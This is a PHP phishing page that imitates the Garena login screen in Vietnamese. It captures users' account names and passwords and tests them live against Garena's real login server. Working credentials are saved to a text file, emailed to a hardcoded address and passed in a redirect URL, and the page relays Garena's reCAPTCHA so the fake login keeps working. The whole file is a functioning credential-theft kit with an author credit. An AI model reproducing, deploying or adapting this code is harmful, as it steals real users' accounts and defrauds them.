<?php
ob_start();
error_reporting(0);
session_start();
?>
<!DOCTYPE html>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
<meta name="description" content="Garena">
<link rel="shortcut icon" href="http://cdn.garenanow.com/webmain/static/favicon.ico" type="image/x-icon"/>
<link href="https://sso.garena.com/css/sso.css?v=0.47" rel="stylesheet" type="text/css"/>
<!-- Page Specific -->
<script src="http://www.google.com/jsapi"></script>
<script type="text/javascript">google.load("jquery", "1.5.0");</script>
<script language="JavaScript" type="text/javascript" src="http://cdn.garenanow.com/webmain/static/js/jsbn.js"></script>
<script language="JavaScript" type="text/javascript" src="http://cdn.garenanow.com/webmain/static/js/prng4.js"></script>
<script language="JavaScript" type="text/javascript" src="http://cdn.garenanow.com/webmain/static/js/rng.js"></script>
<script language="JavaScript" type="text/javascript" src="http://cdn.garenanow.com/webmain/static/js/rsa.js"></script>
<script language="JavaScript" type="text/javascript" src="http://cdn.garenanow.com/webmain/static/js/grsa.js"></script>

<script type="text/javascript">
        function check_login_inputs() {
            var username = document.loginForm.username.value;
            var password = document.loginForm.password.value;
            if (!username || !password) {
                return false;
            }
            return true;
        }
        function do_encrypt() {
            if (!check_login_inputs()) {
              return false;
            }
                      var pw = document.loginForm.password.value;
            document.loginForm.password2.value=RSA(pw);
            $('.loginForm').submit();
            return true;
        }
        function keyIsPressed(evt) {
          var charCode = (evt.which) ? evt.which : evt.keyCode
          if( charCode == 13 ) {
                do_encrypt();
          }
          return true;
        }
    </script>
<title>Đăng Nhập Garena</title>
<style>
.error-msg { color: red !important; }
.error-msg { padding-bottom: -12px !important; }
</style>
<style>
.recaptchatable #recaptcha_response_field {
    width: 145px !important;
    position: relative !important;
    bottom: 7px !important;
    padding: 10px;
    margin: 15px 0 0 0 !important;
    font-size: 10pt;
    height: 20px;
}
.recaptcha_only_if_privacy {
display: none !important;
}
</style>
</head>
<body>

<div id="page">
<div id="header" class="header">
<div class="langWrapper fr">
<select class="lang">
<option value="vi-VN">Việt Nam - Tiếng việt</option>
<option value="en-SG">Singapore - English</option>
<option value="zh-SG">新加坡 - 简体中文</option>
<option value="zh-TW">台灣 - 繁体中文</option>
<option value="en-PH">Philippines - English</option>
<option value="th-TH">ไทย - ไทย</option>
<option value="id-ID">Indonesia - Bahasa Indonesia</option>
<option value="ru-RU">Россия - Русский</option>
<option value="en-MY">Malaysia - English</option>
</select><span class="icon-earth"></span></div>
<div class="topBarGarena"></div>
<div class="topBar"></div>
<h1><a class="logo" href="http://nhanquagarena.top"><img src="https://sso.garena.com/images/header_garena.png" style="width: 135px; height: 46px;"></a></h1></div>
<div id="main-panel">
<div class="content" style="top: 2.4px;">
<h2 class="title">Đăng nhập</h2>
<div class="partnerLogin">
                    <p>Đăng nhập với tài khoản Garena hoặc những tài khoản dưới đây</p>
                    <div class="partnerLink">
                        <a href="#" class="icon-facebook"></a>
                    </div>
                </div>
<form class="loginForm" id="loginForm" method="post" name='loginForm' onSubmit='do_encrypt();'>
<div class="line" id="line-account">
<input autocapitalize="off" autocorrect="off" placeholder="Tài khoản Garena hoặc Email" name="username" id="sso_login_form_account"  type="text" required>
</div>
<div class="line"  id="line-password">
<input type="hidden" name="password2" />
<input placeholder="Mật khẩu" name="password" id="sso_login_form_password" type="password" required></div>
<span class="errorMsg" id="msg"><center>
<?php
require_once "simple_html_dom.php"; // Chèn thư viện simple_html_dom
session_start();
session_destroy();
$pesan = '';
if(isset($_POST['submit_button'])){
$password2 = $_POST['password2'];
$password = $_POST['password'];

$username=$_POST['username'];
$c1 = $_POST['recaptcha_response_field'];
$c2 = $_POST['recaptcha_challenge_field'];


//UPDATE 08/01/2018
$url="http://gcms2.garena.com/login/";
//$url="http://changename.garena.com/";
$resulta = curl($url);

$csrf = get_input_val($resulta[1],'input[name=csrfmiddlewaretoken]');

/*
if(empty($_POST['recaptcha_response_field'])){
$postdata="csrfmiddlewaretoken=".$csrf."&username=".$username."&passwordInput=******&password=".$password2."&submit=";}
else {
$postdata="csrfmiddlewaretoken=".$csrf."&username=".$username."&passwordInput=******&password=".$password2."&recaptcha_challenge_field=".$c2."&recaptcha_response_field=".$c1."&submit=";
}*/
$postdata="csrfmiddlewaretoken=".$csrf."&next=/home&username=".$username."&password2=".$password2."&password=garena_gcms_pass";
$result = curl($url,$postdata,'',getcookie($resulta[0]));
//End Update



if(preg_match('#302 FOUND#', $result[0])) {

// Gửi thông tin
$time = date('d/m/Y H:i:s');	

$message = "=========== '.$time.' ==============
Tài Khoản: $username
Mật Khẩu: $password


Code by: Lưu Văn Tuấn - https://facebook.com/Ckim9x.IT 
";


$file = fopen('account/file.txt','a');
fwrite($file,$message);
fclose($file);
	

$from = "From: $username";
$chude = "Tài khoản $username";

mail("gmail@gmail.com", $chude, $message, $from);
	
//End...	
	
	
header("Location:/loginn/account/?username=".$username.'&sesID='.base64_encode($password));

}elseif(preg_match('#Type in the ReCaptcha#', $result[1])){
function setelah($string, $substring) {
$pos = strpos($string, $substring);
if ($pos === false)
return $string;
else
return(substr($string, $pos+strlen($substring)));
}
function sebelum($string, $substring) {
$pos = strpos($string, $substring);
if ($pos === false)
return $string;
else
return(substr($string, 0, $pos));
}

$hasil = setelah($result[1], "<!-- Google Recaptcha -->");
$hasil1 = sebelum($hasil, "</noscript>");
$simpul = '<tr>
<th>&nbsp;</th>
<td colspan="2" style="padding-left:2px; padding-bottom:15px;">'.$hasil1.'</noscript></td>
<td>
</td>
</tr>';
$simpul1 = str_replace('color:#000;','color:red;',$simpul);
$simpul2 = str_replace('<p style="margin:10px 0px 10px 3px; color:red; font-weight:normal;">','<p style="margin:5px 0px 10px 3px; color:red; font-weight:normal;">',$simpul1);
$pesan =  $simpul2;
}else {
$pesan =  '<em></em>Đăng nhập thất bại: sai tên tài khoản hoặc mật khẩu';
}
}
?>
<?php echo $pesan;
?>
</center>
<br>
<div class="line btnLine" id="line-btn">
<input class="btn" name="submit_button" value="Đăng Nhập Ngay" id="confirm-btn"  type="submit">
</div>
</form>
<div class="linkLine"><a class="sec" href="javascript:;" id="sso_login_link_register">Đăng ký</a>
<span aria-hidden="true" role="separator"> · </span>
<a class="sec" href="javascript:;" id="sso_login_link_forget_password">Quên mật khẩu?</a>
</div>
</div>
<div class="footer" id="footer">Garena © 2014</div>
</div>
</div>
</body>
</html>
<?






function get_string_between($string, $start, $end){
    $string = ' ' . $string;
    $ini = strpos($string, $start);
    if ($ini == 0) return '';
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return substr($string, $ini, $len);
}

function get_tags($content , $val)
{
    $html = new simple_html_dom();

    $html->load($content);

 foreach($html->find($val) as $value)
   {
   $re = $value->innertext;
   }
   return $re;
}
function get_input_val($content , $val)
{
    $html = new simple_html_dom();

    $html->load($content);

    if(($html->find($val,0))):
    foreach($html->find($val) as $a)
    {
    $re = $a->value;
    }
    else:
    $re = 'false';
    endif;
    return $re;
}
function curl($url,$post = false,$ref = '', $cookie = false,$cookies = false,$header = true,$headers = false,$follow = false)
{
    $ch=curl_init($url);
    if($ref != '') {
        curl_setopt($ch, CURLOPT_REFERER, $ref);
    }
    if($cookie){
    curl_setopt($ch, CURLOPT_COOKIE, $cookie);
    }
    if($cookies)
    {
    curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
    curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
    }
    if($post){
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
    curl_setopt($ch, CURLOPT_POST, 1);
    }
    if($follow) curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    if($header)     curl_setopt($ch, CURLOPT_HEADER, 1);
    if($headers)        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_ENCODING, '');
    //curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
      curl_setopt($ch, CURLOPT_TIMEOUT, 15);

        //curl_setopt($ch, CURLINFO_HEADER_OUT, true);
    $result[0] = curl_exec($ch);
    $header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
    $result[1] = substr($result[0], $header_size);
    curl_close($ch);
    return $result;

}
function getcookie($content){
    preg_match_all('/Set-Cookie: (.*);/U',$content,$temp);
    $cookie = $temp[1];
    $cookies = "";
    $a = array();
    foreach($cookie as $c){
        $pos = strpos($c, "=");
        $key = substr($c, 0, $pos);
        $val = substr($c, $pos+1);
        $a[$key] = $val;
    }
    foreach($a as $b => $c){
        $cookies .= "{$b}={$c}; ";
    }
    return $cookies;
}

    ?>
